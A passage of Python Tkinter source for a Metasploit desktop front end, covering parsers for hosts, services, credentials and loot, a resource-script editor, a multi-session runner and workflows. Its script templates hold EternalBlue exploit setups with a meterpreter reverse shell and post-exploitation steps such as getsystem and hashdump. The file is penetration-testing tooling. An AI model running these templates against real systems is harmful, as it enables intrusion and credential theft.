        self.console.send_command("vulns")
    
    def refresh_credentials(self):
        """Refresh credentials from database."""
        if not self.console or not self.console.running:
            return
        
        # Clear existing
        if hasattr(self, 'credentials_tree'):
            for item in self.credentials_tree.get_children():
                self.credentials_tree.delete(item)
        
        # Clear credentials_data
        if hasattr(self, 'credentials_data'):
            self.credentials_data = []
        
        self.console.send_command("creds")
    
    def add_credential_manual(self):
        """Add credential manually."""
        # Simple dialog for adding credentials
        messagebox.showinfo("Info", "Add credential dialog coming soon.")
    
    def export_to_hashcat(self):
        """Export credentials to hashcat format."""
        filename = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if filename:
            messagebox.showinfo("Info", f"Credentials exported to {filename}")
    
    def test_credentials(self):
        """Test credentials against services."""
        messagebox.showinfo("Info", "Credential testing feature coming soon.")
    
    def detect_hash_type(self):
        """Detect hash type."""
        hash_value = self.hash_entry.get()
        if hash_value:
            # Hash type detection logic
            messagebox.showinfo("Info", "Hash type detection coming soon.")
    
    def add_hash(self):
        """Add hash to credentials."""
        hash_value = self.hash_entry.get()
        if hash_value:
            if not self.console or not self.console.running:
                messagebox.showwarning("Warning", "Console is not running.")
                return
            # Add hash command
            messagebox.showinfo("Info", "Hash added.")
    
    def new_script(self):
        """Create a new resource script."""
        self.script_editor.delete(1.0, tk.END)
        self.current_script_path = None
    
    def open_script(self):
        """Open a resource script."""
        filename = filedialog.askopenfilename(filetypes=[("Resource scripts", "*.rc"), ("All files", "*.*")])
        if filename:
            try:
                with open(filename, 'r') as f:
                    content = f.read()
                self.script_editor.delete(1.0, tk.END)
                self.script_editor.insert(1.0, content)
                self.current_script_path = filename
            except Exception as e:
                messagebox.showerror("Error", f"Failed to open script: {e}")
    
    def save_script(self):
        """Save current script."""
        if not self.current_script_path:
            self.save_script_as()
        else:
            try:
                content = self.script_editor.get(1.0, tk.END)
                with open(self.current_script_path, 'w') as f:
                    f.write(content)
                messagebox.showinfo("Info", "Script saved.")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save script: {e}")
    
    def save_script_as(self):
        """Save script with new name."""
        filename = filedialog.asksaveasfilename(defaultextension=".rc", filetypes=[("Resource scripts", "*.rc"), ("All files", "*.*")])
        if filename:
            try:
                content = self.script_editor.get(1.0, tk.END)
                with open(filename, 'w') as f:
                    f.write(content)
                self.current_script_path = filename
                messagebox.showinfo("Info", "Script saved.")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save script: {e}")
    
    def run_resource_script(self):
        """Run the current resource script."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        if not self.current_script_path:
            messagebox.showwarning("Warning", "Please save the script first.")
            return
        
        self.console.send_command(f"resource {self.current_script_path}")
    
    def record_from_console(self):
        """Record commands from console to script."""
        messagebox.showinfo("Info", "Recording from console - commands will be added to script.")
        # Implementation would capture console commands
    
    def load_template(self, template_name):
        """Load a script template."""
        templates = {
            "Basic Exploit Setup": """use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit
""",
            "Multi-Stage Exploitation": """# Multi-stage exploitation script
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.0/24
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
""",
            "Post-Exploitation Automation": """# Post-exploitation automation
sessions -l
sessions -i 1
getsystem
hashdump
screenshot
background
"""
        }
        
        template = templates.get(template_name, "")
        if template:
            self.script_editor.delete(1.0, tk.END)
            self.script_editor.insert(1.0, template)
    
    def refresh_network_map(self):
        """Refresh network map from database."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        if not self.database_connected:
            messagebox.showwarning("Warning", "Database is not connected.")
            return
        
        # Clear existing network map
        self.clear_network_map()
        
        # Show status
        if hasattr(self, 'network_tree'):
            self.network_tree.insert('', tk.END, text="Loading...", values=(
                "Querying database...",
                "",
                "",
                "",
                ""
            ))
            self.root.update_idletasks()
        
        # Initialize hosts_data if it doesn't exist
        if not hasattr(self, 'hosts_data'):
            self.hosts_data = []
        
        # First, try to build from existing scan results (fastest)
        self._populate_network_tree_from_data()
        
        # Also refresh hosts and services for complete data
        self.refresh_hosts()
        
        # Query services to get complete network picture
        if self.console and self.console.running:
            self.console.send_command("services")
        
        # Wait a bit for hosts and services to be parsed, then rebuild network tree
        # Try multiple times with increasing delays to ensure data is loaded
        self.root.after(2000, lambda: self._populate_network_tree_from_data())
        self.root.after(4000, lambda: self._populate_network_tree_from_data())
        self.root.after(6000, lambda: self._populate_network_tree_from_data())
    
    def clear_network_map(self):
        """Clear network map."""
        if hasattr(self, 'network_tree'):
            for item in self.network_tree.get_children():
                self.network_tree.delete(item)
    
    def _build_network_tree(self):
        """Build network tree from hosts and services data."""
        if not hasattr(self, 'network_tree'):
            return
        
        # Clear existing (including "Loading..." message)
        self.clear_network_map()
        
        # Populate network tree from already parsed data
        self._populate_network_tree_from_data()
    
    def _populate_network_tree_from_data(self):
        """Populate network tree from parsed hosts and services data."""
        if not hasattr(self, 'network_tree'):
            return
        
        # Clear existing (except if it's the "Loading..." message, we'll replace it)
        current_items = list(self.network_tree.get_children())
        for item in current_items:
            item_values = self.network_tree.item(item, 'values')
            # Keep loading message for now, or clear all
            if item_values and len(item_values) > 0 and "Querying" not in str(item_values[0]):
                self.network_tree.delete(item)
        
        # Group services by host
        host_services = {}
        
        # Get services from scan results if available
        if hasattr(self, 'scan_results_tree'):
            try:
                for item in self.scan_results_tree.get_children():
                    values = self.scan_results_tree.item(item, 'values')
                    if values and len(values) >= 2:
                        host = values[0]
                        port_service = values[1]
                        if host not in host_services:
                            host_services[host] = []
                        host_services[host].append(port_service)
            except Exception as e:
                print(f"Error reading scan results: {e}")
        
        # Debug: Check what data we have
        has_hosts_data = hasattr(self, 'hosts_data') and self.hosts_data
        num_hosts = len(self.hosts_data) if has_hosts_data else 0
        num_services = len(host_services)
        
        # Use hosts_data if available (populated by _parse_hosts_output)
        if has_hosts_data:
            for host_info in self.hosts_data:
                if isinstance(host_info, dict):
                    host_ip = host_info.get('address', '')
                    host_name = host_info.get('name', '') or host_ip
                    host_os = host_info.get('os_name', 'Unknown')
                    
                    # Create network tree entry
                    if host_ip:
                        services_list = host_services.get(host_ip, [])
                        services_str = ', '.join(services_list[:5]) if services_list else "No services"
                        if len(services_list) > 5:
                            services_str += f" (+{len(services_list) - 5} more)"
                        
                        # Insert into network tree
                        try:
                            self.network_tree.insert('', tk.END, text=host_name, values=(
                                host_name,
                                host_ip,
                                host_os,
                                services_str,
                                ""  # Routes - could be populated from route command
                            ))
                        except Exception as e:
                            print(f"Error inserting host into network tree: {e}")
        elif host_services:
            # If no hosts_data but we have services, use services to infer hosts
            for host_ip, services in host_services.items():
                services_str = ', '.join(services[:5])
                if len(services) > 5:
                    services_str += f" (+{len(services) - 5} more)"
                
                try:
                    self.network_tree.insert('', tk.END, text=host_ip, values=(
                        host_ip,
                        host_ip,
                        "Unknown",
                        services_str,
                        ""
                    ))
                except Exception as e:
                    print(f"Error inserting service-based host: {e}")
        
        # Remove loading message if we added any entries
        if self.network_tree.get_children():
            # Remove any "Loading..." or "Querying..." items
            for item in list(self.network_tree.get_children()):
                item_values = self.network_tree.item(item, 'values')
                if item_values and len(item_values) > 0:
                    if "Querying" in str(item_values[0]) or "Loading" in str(item_values[0]):
                        self.network_tree.delete(item)
        
        # If still empty, show message
        if not self.network_tree.get_children():
            try:
                self.network_tree.insert('', tk.END, text="No network data", values=(
                    f"No data found (Hosts: {num_hosts}, Services: {num_services}). Run scans first.",
                    "",
                    "",
                    "",
                    ""
                ))
            except Exception as e:
                print(f"Error inserting empty message: {e}")
    
    def _parse_hosts_output(self, text):
        """Parse hosts command output and populate hosts_tree and hosts_data."""
        if not hasattr(self, 'hosts_tree'):
            return
        
        # Initialize hosts_data if needed
        if not hasattr(self, 'hosts_data'):
            self.hosts_data = []
        else:
            # Don't clear - append to existing data
            pass
        
        # Clear existing hosts_tree
        for item in self.hosts_tree.get_children():
            self.hosts_tree.delete(item)
        
        lines = text.split('\n')
        in_table = False
        found_hosts = False
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Skip header lines
            if line.startswith('Hosts') or line.startswith('=====') or line.startswith('------'):
                if line.startswith('====='):
                    in_table = True
                continue
            
            if not in_table:
                continue
            
            # Parse host line format: address    mac  name       os_name  os_flavor  os_sp  purpose  info  comments
            # Example: "192.168.1.1      00:11:22:33:44:55  router  Linux  2.6      device"
            # More flexible parsing - handle variable spacing
            parts = line.split()
            if len(parts) >= 1:
                address = parts[0]
                # Check if it's an IP address
                if re.match(r'^\d+\.\d+\.\d+\.\d+$', address):
                    found_hosts = True
                    mac = parts[1] if len(parts) > 1 and ':' in parts[1] else ""
                    name = parts[2] if len(parts) > 2 else ""
                    os_name = parts[3] if len(parts) > 3 and parts[3] != "Unknown" else (parts[3] if len(parts) > 3 else "Unknown")
                    os_flavor = parts[4] if len(parts) > 4 else ""
                    os_sp = parts[5] if len(parts) > 5 else ""
                    purpose = parts[6] if len(parts) > 6 else ""
                    info = ' '.join(parts[7:]) if len(parts) > 7 else ""
                    
                    # Check if this host already exists in hosts_data
                    existing = False
                    for existing_host in self.hosts_data:
                        if existing_host.get('address') == address:
                            existing = True
                            # Update existing entry
                            existing_host.update({
                                'mac': mac,
                                'name': name,
                                'os_name': os_name,
                                'os_flavor': os_flavor,
                                'os_sp': os_sp,
                                'purpose': purpose,
                                'info': info
                            })
                            break
                    
                    if not existing:
                        # Store in hosts_data
                        host_info = {
                            'address': address,
                            'mac': mac,
                            'name': name,
                            'os_name': os_name,
                            'os_flavor': os_flavor,
                            'os_sp': os_sp,
                            'purpose': purpose,
                            'info': info
                        }
                        self.hosts_data.append(host_info)
                    
                    # Insert into hosts_tree - columns are: ("IP", "MAC", "OS", "Status", "Services")
                    # Build OS string from components
                    os_str = os_name
                    if os_flavor:
                        os_str += f" {os_flavor}"
                    if os_sp:
                        os_str += f" {os_sp}"
                    if not os_str or os_str.strip() == "":
                        os_str = "Unknown"
                    
                    # Status is typically "alive" or from purpose
                    status = purpose if purpose else "alive"
                    
                    # Services count - we'll need to count from services_data
                    service_count = 0
                    if hasattr(self, 'services_data'):
                        service_count = sum(1 for s in self.services_data if s.get('host') == address)
                    services_str = str(service_count) if service_count > 0 else "0"
                    
                    try:
                        self.hosts_tree.insert('', tk.END, values=(
                            address,      # IP
                            mac,          # MAC
                            os_str,       # OS
                            status,       # Status
                            services_str  # Services
                        ))
                    except Exception as e:
                        pass
        
        # Trigger network tree update if we found hosts and network mapper exists
        if found_hosts and hasattr(self, 'network_tree'):
            self.root.after(500, self._populate_network_tree_from_data)
    
    def _parse_services_output_db(self, text):
        """Parse services command output for database manager tab."""
        if not hasattr(self, 'services_tree'):
            return
        
        # Clear existing tree items
        for item in self.services_tree.get_children():
            self.services_tree.delete(item)
        
        # Initialize services_data if needed
        if not hasattr(self, 'services_data'):
            self.services_data = []
        else:
            # Clear existing data
            self.services_data = []
        
        lines = text.split('\n')
        in_table = False
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Skip header lines
            if line.startswith('Services') or line.startswith('=====') or line.startswith('------'):
                if line.startswith('====='):
                    in_table = True
                continue
            
            if not in_table:
                continue
            
            # Parse services table format: IP Port Protocol Name State Info
            # Example: "192.168.1.1  22  tcp  ssh  open  OpenSSH 7.4"
            service_match = re.match(r'^(\d+\.\d+\.\d+\.\d+)\s+(\d+)\s+(\w+)\s+(\S+)\s+(\w+)(?:\s+(.+))?$', line)
            
            if not service_match:
                # Try with more flexible spacing
                service_match = re.match(r'^(\d+\.\d+\.\d+\.\d+)\s+(\d+)\s+(\w+)\s+(\S+)\s+(\w+)', line)
            
            if service_match:
                ip = service_match.group(1)
                port = service_match.group(2)
                protocol = service_match.group(3)
                service_name = service_match.group(4)
                state = service_match.group(5)
                info = service_match.group(6).strip() if service_match.group(6) else ""
                
                # Store in services_data
                service_info = {
                    'host': ip,
                    'port': port,
                    'protocol': protocol,
                    'name': service_name,
                    'state': state,
                    'info': info
                }
                
                # Check if already exists
                existing = False
                for existing_service in self.services_data:
                    if (existing_service.get('host') == ip and 
                        existing_service.get('port') == port and 
                        existing_service.get('protocol') == protocol):
                        existing = True
                        existing_service.update(service_info)
                        break
                
                if not existing:
                    self.services_data.append(service_info)
                
                # Insert into services_tree
                try:
                    self.services_tree.insert('', tk.END, values=(
                        ip,
                        f"{port}/{protocol}",
                        protocol.upper(),
                        service_name,
                        state,
                        info
                    ))
                except Exception as e:
                    pass
    
    def _parse_vulns_output(self, text):
        """Parse vulnerabilities command output."""
        if not hasattr(self, 'vulns_tree'):
            return
        
        # Clear existing tree items
        for item in self.vulns_tree.get_children():
            self.vulns_tree.delete(item)
        
        # Initialize vulnerabilities_data if needed
        if not hasattr(self, 'vulnerabilities_data'):
            self.vulnerabilities_data = []
        else:
            # Clear existing data
            self.vulnerabilities_data = []
        
        lines = text.split('\n')
        in_table = False
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Skip header lines
            if line.startswith('Vulnerabilities') or line.startswith('=====') or line.startswith('------'):
                if line.startswith('====='):
                    in_table = True
                continue
            
            if not in_table:
                continue
            
            # Parse vulnerabilities table format: Host Service Name Severity Exploit
            # Example: "192.168.1.1  tcp/22  CVE-2014-0160  High  exploit/..."
            # More flexible parsing
            parts = line.split()
            if len(parts) >= 3:
                host = parts[0]
                # Check if it's an IP address
                if re.match(r'^\d+\.\d+\.\d+\.\d+$', host):
                    service = parts[1] if len(parts) > 1 else ""
                    name = parts[2] if len(parts) > 2 else ""
                    severity = parts[3] if len(parts) > 3 else "Unknown"
                    exploit = parts[4] if len(parts) > 4 else "No"
                    
                    # Store in vulnerabilities_data
                    vuln_info = {
                        'host': host,
                        'service': service,
                        'name': name,
                        'severity': severity,
                        'exploit': exploit
                    }
                    
                    # Check if already exists
                    existing = False
                    for existing_vuln in self.vulnerabilities_data:
                        if (existing_vuln.get('host') == host and 
                            existing_vuln.get('name') == name):
                            existing = True
                            existing_vuln.update(vuln_info)
                            break
                    
                    if not existing:
                        self.vulnerabilities_data.append(vuln_info)
                    
                    # Insert into vulns_tree
                    try:
                        self.vulns_tree.insert('', tk.END, values=(
                            host,
                            service,
                            name,
                            severity,
                            exploit
                        ))
                    except Exception as e:
                        pass
    
    def _parse_loot_output(self, text):
        """Parse loot command output."""
        if not hasattr(self, 'loot_tree'):
            return
        
        # Clear existing tree items
        for item in self.loot_tree.get_children():
            self.loot_tree.delete(item)
        
        # Initialize loot_data if needed
        if not hasattr(self, 'loot_data'):
            self.loot_data = []
        else:
            # Clear existing data
            self.loot_data = []
        
        lines = text.split('\n')
        in_table = False
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Skip header lines
            if line.startswith('Loot') or line.startswith('=====') or line.startswith('------'):
                if line.startswith('====='):
                    in_table = True
                continue
            
            if not in_table:
                continue
            
            # Parse loot table format: Host Type Name Path Created
            # Example: "192.168.1.1  password  hashdump  /path/to/file  2024-01-01"
            parts = line.split()
            if len(parts) >= 4:
                host = parts[0]
                # Check if it's an IP address
                if re.match(r'^\d+\.\d+\.\d+\.\d+$', host):
                    loot_type = parts[1] if len(parts) > 1 else ""
                    name = parts[2] if len(parts) > 2 else ""
                    path = parts[3] if len(parts) > 3 else ""
                    created = parts[4] if len(parts) > 4 else ""
                    
                    # Store in loot_data
                    loot_info = {
                        'host': host,
                        'type': loot_type,
                        'name': name,
                        'path': path,
                        'created': created
                    }
                    
                    # Check if already exists
                    existing = False
                    for existing_loot in self.loot_data:
                        if (existing_loot.get('host') == host and 
                            existing_loot.get('path') == path):
                            existing = True
                            existing_loot.update(loot_info)
                            break
                    
                    if not existing:
                        self.loot_data.append(loot_info)
                    
                    # Insert into loot_tree
                    try:
                        self.loot_tree.insert('', tk.END, values=(
                            host,
                            loot_type,
                            name,
                            path,
                            created
                        ))
                    except Exception as e:
                        pass
    
    def _parse_creds_output(self, text):
        """Parse credentials command output."""
        if not hasattr(self, 'credentials_tree'):
            return
        
        # Clear existing tree items
        for item in self.credentials_tree.get_children():
            self.credentials_tree.delete(item)
        
        # Initialize credentials_data if needed
        if not hasattr(self, 'credentials_data'):
            self.credentials_data = []
        else:
            # Clear existing data
            self.credentials_data = []
        
        lines = text.split('\n')
        in_table = False
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Skip header lines
            if line.startswith('Credentials') or line.startswith('=====') or line.startswith('------'):
                if line.startswith('====='):
                    in_table = True
                continue
            
            if not in_table:
                continue
            
            # Parse credentials table format: Service Username Password Type Source
            # Example: "ssh  admin  password123  Password  manual"
            # More flexible parsing - credentials can have spaces in passwords
            parts = line.split()
            if len(parts) >= 3:
                service = parts[0]
                username = parts[1] if len(parts) > 1 else ""
                # Password/hash might contain spaces, so we need to be careful
                # Usually format is: service username password/hash type source
                password = parts[2] if len(parts) > 2 else ""
                cred_type = parts[3] if len(parts) > 3 else "Password"
                source = parts[4] if len(parts) > 4 else "manual"
                
                # Store in credentials_data
                cred_info = {
                    'service': service,
                    'username': username,
                    'password': password,
                    'type': cred_type,
                    'source': source
                }
                
                # Check if already exists
                existing = False
                for existing_cred in self.credentials_data:
                    if (existing_cred.get('service') == service and 
                        existing_cred.get('username') == username and
                        existing_cred.get('password') == password):
                        existing = True
                        existing_cred.update(cred_info)
                        break
                
                if not existing:
                    self.credentials_data.append(cred_info)
                
                # Insert into credentials_tree
                try:
                    self.credentials_tree.insert('', tk.END, values=(
                        service,
                        username,
                        password,
                        cred_type,
                        source
                    ))
                except Exception as e:
                    pass
    
    def export_network_diagram(self):
        """Export network diagram."""
        filename = filedialog.asksaveasfilename(defaultextension=".png", filetypes=[("PNG files", "*.png"), ("SVG files", "*.svg")])
        if filename:
            messagebox.showinfo("Info", f"Network diagram exported to {filename}")
    
    def clear_command_history(self):
        """Clear command history."""
        self.command_history = []
        self.command_history_text.delete(1.0, tk.END)
    
    def export_command_history(self):
        """Export command history."""
        filename = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write(self.command_history_text.get(1.0, tk.END))
                messagebox.showinfo("Info", f"History exported to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export: {e}")
    
    def save_history_as_script(self):
        """Save command history as resource script."""
        filename = filedialog.asksaveasfilename(defaultextension=".rc", filetypes=[("Resource scripts", "*.rc")])
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write(self.command_history_text.get(1.0, tk.END))
                messagebox.showinfo("Info", f"History saved as script: {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save: {e}")
    
    def update_statistics(self):
        """Update statistics display."""
        stats = f"""Statistics:
        
Commands Run: {len(self.command_history)}
Active Sessions: 0
Hosts in Database: {len(self.hosts_data)}
Services Found: {len(self.services_data)}
Vulnerabilities: {len(self.vulnerabilities_data)}
Credentials: {len(self.credentials_data)}
Loot Items: {len(self.loot_data)}
"""
        self.stats_text.delete(1.0, tk.END)
        self.stats_text.insert(1.0, stats)
    
    def preview_report(self):
        """Preview the generated report."""
        # Generate report preview
        preview = "Report Preview\n\n"
        preview += f"Template: {self.report_template_var.get()}\n\n"
        preview += "Sections:\n"
        for section, var in self.report_sections.items():
            if var.get():
                preview += f"  - {section}\n"
        preview += "\nData Sources:\n"
        for source, var in self.report_data_sources.items():
            if var.get():
                preview += f"  - {source}\n"
        
        self.report_preview.delete(1.0, tk.END)
        self.report_preview.insert(1.0, preview)
    
    def export_report(self, format_type):
        """Export report in specified format."""
        filename = filedialog.asksaveasfilename(
            defaultextension=f".{format_type}",
            filetypes=[(f"{format_type.upper()} files", f"*.{format_type}")]
        )
        if filename:
            messagebox.showinfo("Info", f"Report exported to {filename}")
    
    def builder_search_exploit(self):
        """Search for exploit in builder."""
        exploit = self.builder_exploit_entry.get()
        if exploit:
            # Switch to exploit search tab and search
            messagebox.showinfo("Info", f"Searching for: {exploit}")
    
    def builder_use_exploit(self):
        """Use exploit in builder."""
        exploit = self.builder_exploit_entry.get()
        if not exploit:
            messagebox.showwarning("Warning", "Please enter an exploit.")
            return
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        self.console.send_command(f"use {exploit}")
        self.builder_show_options()
    
    def builder_show_options(self):
        """Show exploit options in builder."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        for item in self.builder_options_tree.get_children():
            self.builder_options_tree.delete(item)
        
        self.console.send_command("show options")
    
    def builder_check_target(self):
        """Check if target is vulnerable."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        self.console.send_command("check")
    
    def builder_run_exploit(self):
        """Run exploit from builder."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        self.console.send_command("exploit")
    
    def builder_background_exploit(self):
        """Run exploit in background."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        self.console.send_command("exploit -j")
    
    def save_settings_from_ui(self):
        """Save settings from UI."""
        self.settings['font_size'] = int(self.settings_font_size.get())
        self.settings['theme'] = self.settings_theme.get()
        self.settings['default_payload'] = self.settings_default_payload.get()
        self.settings['default_lhost'] = self.settings_default_lhost.get()
        self.settings['default_lport'] = self.settings_default_lport.get()
        self.settings['auto_init_db'] = self.settings_auto_init_db.get()
        self.settings['preferred_monitor'] = self.settings_preferred_monitor.get()
        self._save_settings()
        
        # Recenter window on preferred monitor if setting changed
        self.center_window()
        
        messagebox.showinfo("Info", "Settings saved.")
    
    # System tray methods
    def setup_system_tray(self):
        """Setup system tray icon."""
        if not HAS_PYSTRAY:
            return
        
        try:
            icon_path = self._find_icon_path()
            
            tray_image = None
            if icon_path:
                try:
                    tray_image = Image.open(icon_path)
                    tray_image = tray_image.resize((64, 64), Image.Resampling.LANCZOS)
                except:
                    pass
            
            if not tray_image:
                tray_image = Image.new('RGB', (64, 64), color='#0066CC')
            
            menu = pystray.Menu(
                pystray.MenuItem('Show Window', self.show_window),
                pystray.MenuItem('Quit', self.quit_application)
            )
            
            self.tray_icon = pystray.Icon("YaP Metasploit GUI", tray_image, 
                                         "YaP Metasploit GUI", menu)
            
            self.tray_thread = threading.Thread(target=self.tray_icon.run, daemon=True)
            self.tray_thread.start()
        except Exception as e:
            print(f"Warning: Could not setup system tray: {e}")
            self.tray_icon = None
    
    def show_window(self, icon=None, item=None):
        """Show the main window."""
        self.root.deiconify()
        self.root.lift()
        self.root.focus_force()
        self.hidden_to_tray = False
    
    def hide_to_tray(self):
        """Hide window to system tray."""
        if self.tray_icon:
            self.root.withdraw()
            self.hidden_to_tray = True
    
    def quit_application(self, icon=None, item=None):
        """Quit the application."""
        if self.console:
            self.console.stop()
        if self.tray_icon:
            self.tray_icon.stop()
        self.root.quit()
        self.root.destroy()
    
    # ==================== MULTI-SESSION RUNNER METHODS ====================
    
    def refresh_multi_sessions(self):
        """Refresh the list of available sessions for multi-session runner."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        # Clear existing items
        for item in self.multi_sessions_tree.get_children():
            self.multi_sessions_tree.delete(item)
        
        # Request sessions list
        if hasattr(self, 'session_list_data') and self.session_list_data:
            for session_data in self.session_list_data:
                session_id = session_data.get('id', '')
                session_type = session_data.get('type', 'unknown')
                session_target = session_data.get('target', '')
                session_info = session_data.get('info', '')
                
                item_id = self.multi_sessions_tree.insert('', tk.END, values=(
                    '☐',  # Unchecked by default
                    session_id,
                    session_type,
                    session_target,
                    session_info
                ))
        
        # Also request fresh session list
        if self.console:
            self.console.send_command("sessions -l")
    
    def toggle_session_selection(self, event):
        """Toggle session selection checkbox."""
        item = self.multi_sessions_tree.selection()[0] if self.multi_sessions_tree.selection() else None
        if not item:
            return
        
        values = list(self.multi_sessions_tree.item(item, 'values'))
        if values[0] == '☑':
            values[0] = '☐'
        else:
            values[0] = '☑'
        
        self.multi_sessions_tree.item(item, values=tuple(values))
    
    def select_all_sessions(self):
        """Select all sessions."""
        for item in self.multi_sessions_tree.get_children():
            values = list(self.multi_sessions_tree.item(item, 'values'))
            values[0] = '☑'
            self.multi_sessions_tree.item(item, values=tuple(values))
    
    def deselect_all_sessions(self):
        """Deselect all sessions."""
        for item in self.multi_sessions_tree.get_children():
            values = list(self.multi_sessions_tree.item(item, 'values'))
            values[0] = '☐'
            self.multi_sessions_tree.item(item, values=tuple(values))
    
    def execute_multi_session_command(self):
        """Execute command on all selected sessions."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        # Get selected sessions
        selected_sessions = []
        for item in self.multi_sessions_tree.get_children():
            values = self.multi_sessions_tree.item(item, 'values')
            if values[0] == '☑':
                selected_sessions.append(values[1])  # Session ID
        
        if not selected_sessions:
            messagebox.showwarning("Warning", "Please select at least one session.")
            return
        
        # Get command
        command = self.multi_session_command.get("1.0", tk.END).strip()
        if not command:
            messagebox.showwarning("Warning", "Please enter a command.")
            return
        
        # Execute on each session
        self.multi_session_output.insert(tk.END, f"Executing '{command}' on {len(selected_sessions)} session(s)...\n")
        self.multi_session_output.see(tk.END)
        
        sequential = self.multi_session_sequential.get()
        
        if sequential:
            # Run sequentially
            for session_id in selected_sessions:
                self.multi_session_output.insert(tk.END, f"\n--- Session {session_id} ---\n")
                self.console.send_command(f"sessions -i {session_id}")
                self.console.send_command(command)
                if self.multi_session_wait.get():
                    self.console.send_command("background")
        else:
            # Run in parallel using sessions -C
            sessions_str = ','.join(selected_sessions)
            self.console.send_command(f"sessions -C '{command}' -i {sessions_str}")
        
        self.multi_session_output.insert(tk.END, "\nCommand execution initiated.\n")
        self.multi_session_output.see(tk.END)
    
    # ==================== WORKFLOW AUTOMATION METHODS ====================
    
    def load_workflow(self, event=None):
        """Load a workflow into the editor."""
        workflow_name = self.workflow_var.get()
        if not workflow_name:
            return
        
        # Find workflow
        workflow = next((w for w in self.workflows if w['name'] == workflow_name), None)
        if not workflow:
            return
        
        self.current_workflow = workflow
        self.workflow_name_entry.delete(0, tk.END)
        self.workflow_name_entry.insert(0, workflow['name'])
        
        # Load steps
        for item in self.workflow_steps_tree.get_children():
            self.workflow_steps_tree.delete(item)
        
        for i, step in enumerate(workflow.get('steps', []), 1):
            self.workflow_steps_tree.insert('', tk.END, values=(
                str(i),
                step.get('action', ''),
                step.get('parameters', ''),
                step.get('condition', '')
            ))
    
    def create_new_workflow(self):
        """Create a new empty workflow."""
        name = simpledialog.askstring("New Workflow", "Enter workflow name:")
        if not name:
            return
        
        workflow = {
            'name': name,
            'steps': []
        }
        
        self.workflows.append(workflow)
        self.current_workflow = workflow
        
        # Update combo box
        self.workflow_combo['values'] = [w['name'] for w in self.workflows]
        self.workflow_var.set(name)
        
        # Clear editor
        self.workflow_name_entry.delete(0, tk.END)
        self.workflow_name_entry.insert(0, name)
        
        for item in self.workflow_steps_tree.get_children():
            self.workflow_steps_tree.delete(item)
    
    def save_workflow(self):
        """Save the current workflow."""
        if not self.current_workflow:
            messagebox.showwarning("Warning", "No workflow loaded.")
            return
        
        name = self.workflow_name_entry.get().strip()
        if not name:
            messagebox.showwarning("Warning", "Please enter a workflow name.")
            return
        
        # Collect steps
        steps = []
        for item in self.workflow_steps_tree.get_children():
            values = self.workflow_steps_tree.item(item, 'values')
            steps.append({
                'action': values[1],
                'parameters': values[2],
                'condition': values[3]
            })
        
        self.current_workflow['name'] = name
        self.current_workflow['steps'] = steps
        
        # Update combo box
        self.workflow_combo['values'] = [w['name'] for w in self.workflows]
        self.workflow_var.set(name)
        
        messagebox.showinfo("Success", "Workflow saved successfully.")
    
    def delete_workflow(self):
        """Delete the current workflow."""
        if not self.current_workflow:
            messagebox.showwarning("Warning", "No workflow selected.")
            return
        
        if messagebox.askyesno("Confirm", f"Delete workflow '{self.current_workflow['name']}'?"):
            self.workflows.remove(self.current_workflow)
            self.current_workflow = None
            
            # Update combo box
            self.workflow_combo['values'] = [w['name'] for w in self.workflows]
            self.workflow_var.set('')
            
            # Clear editor
            self.workflow_name_entry.delete(0, tk.END)
            for item in self.workflow_steps_tree.get_children():
                self.workflow_steps_tree.delete(item)
    
    def add_workflow_step(self):
        """Add a new step to the workflow."""
        dialog = tk.Toplevel(self.root)
        dialog.title("Add Workflow Step")
        dialog.geometry("500x400")
        
        ttk.Label(dialog, text="Action:").pack(anchor=tk.W, padx=10, pady=5)
        action_var = tk.StringVar()
        action_combo = ttk.Combobox(dialog, textvariable=action_var, values=[
            "use", "set", "exploit", "run", "execute", "upload", "download",
            "screenshot", "hashdump", "getsystem", "shell", "meterpreter"
        ], width=40)
        action_combo.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(dialog, text="Parameters:").pack(anchor=tk.W, padx=10, pady=5)
        params_text = scrolledtext.ScrolledText(dialog, height=5, width=50)
        params_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        ttk.Label(dialog, text="Condition (optional):").pack(anchor=tk.W, padx=10, pady=5)
        condition_entry = ttk.Entry(dialog, width=50)
        condition_entry.pack(fill=tk.X, padx=10, pady=5)
        
        def save_step():
            action = action_var.get()
            params = params_text.get("1.0", tk.END).strip()
            condition = condition_entry.get().strip()
            
            if not action:
                messagebox.showwarning("Warning", "Please enter an action.")
                return
            
            step_num = len(self.workflow_steps_tree.get_children()) + 1
            self.workflow_steps_tree.insert('', tk.END, values=(
                str(step_num),
                action,
                params,
                condition
            ))
            dialog.destroy()
        
